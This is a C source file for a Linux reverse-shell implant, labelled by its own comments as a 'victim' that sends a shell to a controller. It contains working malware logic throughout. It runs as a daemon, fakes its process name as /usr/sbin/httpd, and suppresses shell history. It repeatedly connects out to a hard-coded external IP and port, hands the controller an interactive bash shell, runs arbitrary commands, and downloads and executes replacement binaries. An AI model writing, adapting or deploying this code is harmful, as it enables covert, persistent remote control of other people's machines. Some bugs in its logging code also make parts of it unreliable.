/*
 * vict.c - victim, which send shell to controller(cntl)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stdarg.h>
#include <fcntl.h>
#include <netdb.h>
#include <pty.h>
#include <errno.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

// Some constant
#define ADDR       "221.123.179.91"
#define PORT       "433"
#define FAKE_TITLE "/usr/sbin/httpd"
#define _LOG_PATH  "vict.log"

// Some self-defined struct
typedef struct
{
    int32_t ws_row;
    int32_t ws_col;
    char    flag[4];
} WINCH, *pWINCH;
 
typedef struct
{
    int32_t ws_row;
    int32_t ws_col;
    char    term[255];
} MSG, *pMSG;

// Some global variables
extern char **environ;  // defined in <unistd.h>, storing environment vars.
static FILE *log_fp = NULL;
char        magickey[2] = {0377, 0377};

int         isupdate = 0;
char        exename[250];
void        last() __attribute__ ((destructor));


// SOME FUNCTIONS HERE
// Raw send function.
int full_send(int fd, void *buf, int size)
{
    int ret, total=0;

    while (size) {
        ret = send(fd, buf, size, 0);
        if (ret < 0) return ret;

        total += ret;
        size -= ret;
        buf += ret;
    }

    return total;
}

// Raw recv function.
int full_recv(int fd, void *buf, int size)
{
    int ret, total=0;

    while (size) {
        ret = recv(fd, buf, size, 0);
        if (ret <= 0) return ret;

        total += ret;
        size -= ret;
        buf += ret;
    }

    return total;
}

// Self-defined send.
int wsend(int fd, void *buf, int size)
{
    int ret;

    // send data length firstly
    ret = full_send(fd, &size, sizeof(int32_t));
    if (ret < 0) return ret;

    // send data secondly
    ret = full_send(fd, buf, size);

    return ret;
}

// Self-defined recv.
int wrecv(int fd, void *buf)
{
    int ret, size;

    // receive data length firstly
    ret = full_recv(fd, &size, sizeof(int32_t));
    if (ret <= 0) return ret;

    // receive data secondly
    ret = full_recv(fd, buf, size);

    return ret;
}

// Write logs.
void debuglog(char *msg, ...)
{
#ifdef _LOG_PATH
    va_list argp;
    char    *lf = "\n";
    char    msgtm[BUFSIZ+1] = { 0 };
    struct  tm *t;
    time_t  tt;

    if (log_fp == NULL)
        log_fp = fopen(_LOG_PATH, "a");

    time(&tt);
    t = localtime(&tt);
    sprintf(msg, "[%4d/%02d/%02d %02d:%02d:%02d] %s", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec, msg);

    va_start(argp, msg);
    vfprintf(log_fp, msgtm, argp);
    fwrite(lf, strlen(lf), 1, log_fp);
    va_end(argp);

    fflush(log_fp);
#endif
}

// Run after main exits.
void last()
{
    if (isupdate == 1) {
        debuglog("[note] program reloaded.");
        char newexename[255] = { 0 };

        sprintf(newexename, "%s.new", exename);
        if (rename(newexename, exename) == -1)
            debuglog("[error] rename update file failed");
        execl(exename, exename, NULL);
    }
}

// Run in background.
int daemonme()
{
    int pid = fork();

    if (pid != 0) {
        exit(0);
    }
    // set child as process group leader, detaching from parent session.
    if (setsid() < 0) {
        return 1;
    }

    return 0;
}

// Change process name to FAKE_TITLE.
void chtitle(char *argv0)
{
    char *title     = FAKE_TITLE;
    char *pEnvLast  = NULL;
    int  i, envSize = 0;

    for (i = 0; environ[i]; ++i) {
        envSize = envSize + strlen(environ[i]) + 1;
    }

    pEnvLast = environ[i-1] + strlen(environ[i-1]) + 1;

    char *pEnv = malloc(envSize);
    for (i = 0; environ[i]; ++i) {

        strcpy(pEnv, environ[i]);
        pEnv = pEnv + strlen(environ[i]) + 1;
        environ[i] = pEnv;
    }

    strncpy(argv0, title, pEnvLast-argv0);
}

// Give a full pty shell to cntl.
int fork_shell(int cntl)
{
    fd_set         rd;
    struct winsize ws;
    char           *slave, *shell="/bin/sh";
    int            ret, pid, mpty, spty, n;

    char           buffer[BUFSIZ+1];
    bzero(&buffer, sizeof buffer);

    // mpty is master pty, spty is slave pty
    // parent process uses mpty, child process uses spty
    if (openpty(&mpty, &spty, NULL, NULL, NULL) < 0) {
        debuglog("[error] openpty(): %s", strerror(errno));
        return 1;
    }

    slave = ttyname(spty);
    if (slave == NULL) {
        debuglog("[error] ttyname(spty): %s", strerror(errno));
        return 1;
    }

    // set HISTFILE env var
    putenv("HISTFILE=");

    // receive <TERM var> and <winsize> of cntl stdin
    if ((ret = wrecv(cntl, buffer)) < 0) {
        debuglog("[error] recv(): %s", strerror(errno));
        return 1;
    }

    // retrieve TERM value and set it to vict
    pMSG msg = (pMSG)&buffer;
    putenv(msg->term);

    // retrieve winsize and set it to vict
    ws.ws_row = msg->ws_row;
    ws.ws_col = msg->ws_col;
    ws.ws_xpixel = 0;
    ws.ws_ypixel = 0;

    // set winsize to mpty
    if (ioctl(mpty, TIOCSWINSZ, &ws) < 0) {
        debuglog("[error] mpty ioctl(): %s", strerror(errno));
    }

    // fork child process. parent uses mpty, child uses spty
    if ((pid = fork()) < 0) {
        debuglog("[error] fork(): %s", strerror(errno));
        return 1;
    }

    if (pid == 0) {
        // child
        close(cntl);
        close(mpty);

        if (setsid() < 0) {
            debuglog("[error] child setsid(): %s", strerror(errno));
        }

        // set spty
        if (ioctl(spty, TIOCSCTTY, NULL) < 0) {
            debuglog("[error] child ioctl(): %s", strerror(errno));
        }

        // redirect stdin,stdout,stderr to spty
        dup2(spty, 0);
        dup2(spty, 1);
        dup2(spty, 2);

        // if dup2 failed
        if (spty > 2) {
            close(spty);
        }

        execl(shell, shell+5, "-c", "exec bash --login", (char *)0);

    } else {
        // parent
        close(spty);

        while (1) {

            FD_ZERO(&rd);
            FD_SET(cntl, &rd);
            FD_SET(mpty, &rd);
            n = (mpty > cntl) ? mpty : cntl;

            bzero(&buffer, sizeof buffer);

            if (select(n+1, &rd, NULL, NULL, NULL) == 0) {
                debuglog("[error] parent select(): %s", strerror(errno));
                return 1;
            }

            if (FD_ISSET(cntl, &rd)) {

                if ((ret = wrecv(cntl, buffer)) > 0) {
                    // check whether WINCH data or not
                    pWINCH winch = (pWINCH)buffer;

                    if (winch->flag[0]==magickey[0]
                     && winch->flag[1]==magickey[1]
                     && winch->flag[2]=='s'
                     && winch->flag[3]=='s')
                    {
                        ws.ws_row = winch->ws_row;
                        ws.ws_col = winch->ws_col;
                        ws.ws_xpixel = 0;
                        ws.ws_ypixel = 0;

                        debuglog("[note] got new win size of cntl: %d,%d", ws.ws_row, ws.ws_col);
                        ioctl(mpty, TIOCSWINSZ, &ws);

                    } else {
                        if (strcmp(buffer, "check_status") == 0)
                            continue;

                        // write data from cntl to mpty
                        ret = write(mpty, &buffer, ret);

                        if (ret <= 0) {
                            debuglog("[error] parent write(): %s", strerror(errno));
                            break;
                        }
                    }

                } else {
                    debuglog("[warn] seems lost connection. quit shell...\n");
                    break;
                }
            }

            // send the std input & command output
            if (FD_ISSET(mpty, &rd)) {
                if ((ret = read(mpty, buffer, BUFSIZ)) > 0) {
                    ret = wsend(cntl, &buffer, ret);

                    if (ret <= 0) {
                        debuglog("[error] parent wsend failed. quit shell...");
                        break;
                    }

                } else {
                    debuglog("[note] seems logout. quit shell...");
                    break;
                }
            }
        }

        return 0;
    }

    return 1;
}

// Validate nick
int illegal_nick(char *nick)
{
    return (strlen(nick)==0 || strlen(nick)>=50 || strstr(nick,"|") || strstr(nick," ")) ? 1:0;
}

// Receive victim executable file.
int get_exe(int cntl)
{
    int    fstat = 0, fsize = 0;
    size_t n = 0;
    char   buff[BUFSIZ+1];
    bzero(&buff, sizeof buff);

    // receive file name
    if (wrecv(cntl, buff) <= 0) {
        debuglog("[error] cannot recv file name...");
        return 1;
    }
    debuglog("[note] recv filename: %s, fnamelen: %zu", buff, strlen(buff));

    // receive file size
    if (wrecv(cntl, (char *)&fsize) <= 0) {
        debuglog("[error] cannot recv file size...");
        return 1;
    }
    debuglog("[note] recv file size: %d", fsize);

    // receive file mode
    if (wrecv(cntl, (char *)&fstat) <= 0) {
        debuglog("[error] cannot recv file mode...");
        return 1;
    }
    debuglog("[note] recv file mode: %d", fstat);

    // create file
    strcat(buff, ".new");
    FILE *fp = fopen(buff, "wb");
    if (fp == NULL) {
        perror("[error] can't create file");
        return 1;
    }

    // change file mode
    if (chmod(buff, fstat) < 0) {
        debuglog("[error] change file mode fail...");
        return 1;
    }

    // write file
    int recvsize = 0;
    debuglog("[note] start receiving file...");
    bzero(&buff, sizeof buff);
    while (recvsize != fsize) {
        n = recv(cntl, buff, 1024, 0);
        if (n == -1) {
            debuglog("[error] receive file error.");
            return 1;
        }

        printf("got data: %s\n", buff);

        if (fwrite(buff, sizeof(char), n, fp) != n) {
            debuglog("[error] write file error.");
            return 1;
        }

        memset(buff, 0, 1024);
        recvsize += n;
    }
    debuglog("[note] receive file success.");

    fclose(fp);

    isupdate = 1;  // set update flag = 1
    return 0;
}

// Connect cntl and deal with command from cntl.
int talk_cntl(char *nick)
{
    struct tcp_info    info;
    struct sockaddr_in cntl_addr;
    int                cntl=-1, sockopt=1, sockinfo=sizeof(info);
    char               buffer[BUFSIZ+1];
 
    memset(&cntl_addr, 0, sizeof(cntl_addr));

    cntl_addr.sin_family      = AF_INET;
    cntl_addr.sin_addr.s_addr = inet_addr(ADDR);
    cntl_addr.sin_port        = htons(atoi(PORT));
 
    // if failed, reconnect every 10s
    while (1) {
        debuglog("[note] connecting to %s:%s", ADDR, PORT);
        cntl = socket(AF_INET, SOCK_STREAM, 0);

        setsockopt(cntl, SOL_SOCKET, SO_KEEPALIVE, (void *)&sockopt, sizeof(sockopt));
        setsockopt(cntl, SOL_SOCKET, SO_REUSEADDR, (void *)&sockopt, sizeof(sockopt));

        if (connect(cntl, (struct sockaddr *)&cntl_addr, sizeof(cntl_addr)) < 0) {
            debuglog("[warn] connect fail, reconnect...: %s", strerror(errno));

        } else {
            // first send auth token to cntl
            if (wsend(cntl, "helloserver", 11) < 0) {
                debuglog("[error] send auth token fail. bye...");
                close(cntl);
                return 1;
            }

            // send nick to cntl
            if (wsend(cntl, nick, strlen(nick)) <= 0) {
                debuglog("[error] send nick fail. bye...");
                close(cntl);
                return 1;
            }

            // check if the client uid already in the cntl list
            bzero(&buffer, sizeof buffer);
            if (wrecv(cntl, buffer) <= 0) {
                debuglog("[error] recv uid check fail. bye...");
                close(cntl);
                return 1;
            }
            if (strcmp(buffer, "uid_ok")) {
                debuglog("[error] uid not ok. bye...");
                close(cntl);
                return 1;
            }

            debuglog("[note] waiting...");

            while (1) {
                // check connection status
                getsockopt(cntl, IPPROTO_TCP, TCP_INFO, &info, (socklen_t *)&sockinfo);
                if (info.tcpi_state != TCP_ESTABLISHED) {
                    debuglog("[error] connection broken, reconnecting...");
                    close(cntl);
                    break;
                }

                // receive command from cntl
                bzero(&buffer, sizeof buffer);
                if (wrecv(cntl, buffer) <=0) {
                    debuglog("[error] got command fail, reconnecting...");
                    close(cntl);
                    break;
                }
                // ignored commands
                if (!strcmp(buffer, "check_status") || !strcmp(buffer, "")) {
                    continue;
                }
                // shutdown me
                if (strcmp(buffer, "shutdown_victim") == 0) {
                    debuglog("[note] got shut, exited.");
                    close(cntl);
                    return 0;
                }
                // send shell to controller
                if (strcmp(buffer, "get_victim") == 0) {
                    fork_shell(cntl);
                    wsend(cntl, "shell_exit_ok", strlen("shell_exit_ok"));
                }
                // got batch command
                if (strncmp(buffer, "batch_command ", 14) == 0) {
                    FILE *cmdpipe;
                    char vcmd[BUFSIZ+1];

                    // retrieve command
                    bzero(vcmd, sizeof vcmd);
                    strcpy(vcmd, buffer+14);

                    // execute command
                    if (!(cmdpipe = popen(vcmd, "r"))) {
                        continue;
                    }

                    // send result to controller
                    bzero(buffer, sizeof buffer);
                    while (fgets(buffer, BUFSIZ+1, cmdpipe) != NULL) {
                        if (wsend(cntl, buffer, strlen(buffer)) < 0) {
                            debuglog("[error] send result fail: [%s] %s", vcmd, buffer);
                            break;
                        }
                    }

                    pclose(cmdpipe);
                }
                // update victim executable
                if (strcmp(buffer, "upgrade_victim") == 0) {
                    debuglog("[note] got upgrade_victim command.");
                    if (get_exe(cntl) == 0) {
                        close(cntl);
                        return 0;
                    }
                    else
                        debuglog("[error] get executable failed.");
                }
                
            }
        }

        close(cntl);
        sleep(10);
    }

    return 0;
}

// Main function.
int main(int argc, char **argv)
{
    char nick[4096];
    int  nick_len = -1;

    if (argc < 2) {
        if (gethostname(nick, nick_len) < 0) {
            debuglog("[error] gethostname(): %s", strerror(errno));
            return 1;
        }
    } else if (argc > 2) {
        printf("Usage: %s <nick>\n\t<nick> should be 1-49 chars, with no | or space char.\n", argv[0]);
        return 1;
    }
    else
        strcpy(nick, argv[1]);

    if (illegal_nick(nick)) {
        debuglog("[error] illegal nick: %s", argv[1]);
        return 1;
    }

    // get exename
    bzero(exename, sizeof exename);
    readlink("/proc/self/exe", exename, sizeof exename);
    debuglog("[note] exename is %s", exename);

    daemonme();
    chtitle(argv[0]);

    return talk_cntl(nick);
}
